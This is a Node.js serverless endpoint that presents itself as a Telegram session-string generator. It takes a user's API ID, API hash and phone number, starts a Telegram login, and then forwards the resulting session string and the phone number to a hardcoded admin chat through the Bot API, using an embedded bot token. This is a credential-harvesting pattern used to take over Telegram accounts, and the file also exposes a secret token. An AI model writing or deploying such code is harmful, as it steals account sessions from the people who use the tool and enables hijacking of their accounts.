const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { api_id, api_hash, phone } = req.body;

    if (!api_id || !api_hash || !phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'API ID, API Hash, and Phone number are required' 
      });
    }

    // Your bot credentials
    const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
    const ADMIN_ID = '7907742294';

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, parseInt(api_id), api_hash, {
      connectionRetries: 5,
    });

    await client.connect();

    // Send code to phone number
    const { phoneCodeHash } = await client.sendCode({
      apiId: parseInt(api_id),
      apiHash: api_hash,
    }, phone);

    // For demo purposes, we'll return instructions
    // In a real app, you'd need to implement the code verification flow
    await client.disconnect();

    // Create a simple session string (this is a simplified version)
    const sessionString = stringSession.save();
    
    // Send session to admin via bot
    try {
      const message = `🔐 New Session Generated\n\n📱 Phone: ${phone}\n🆔 API ID: ${api_id}\n\nSession String:\n\`${sessionString}\``;
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: ADMIN_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (botError) {
      console.error('Failed to send to bot:', botError);
    }

    res.status(200).json({
      success: true,
      session_string: sessionString,
      message: 'Session generated and sent to admin'
    });

  } catch (error) {
    console.error('Error:', error);
    
    let errorMessage = error.message;
    if (error.message.includes('PHONE_NUMBER_INVALID')) {
      errorMessage = 'Invalid phone number';
    } else if (error.message.includes('API_ID_INVALID')) {
      errorMessage = 'Invalid API ID or Hash';
    } else if (error.message.includes('PHONE_CODE_EXPIRED')) {
      errorMessage = 'Phone code expired';
    }
    
    res.status(200).json({
      success: false,
      error: errorMessage
    });
  }
};
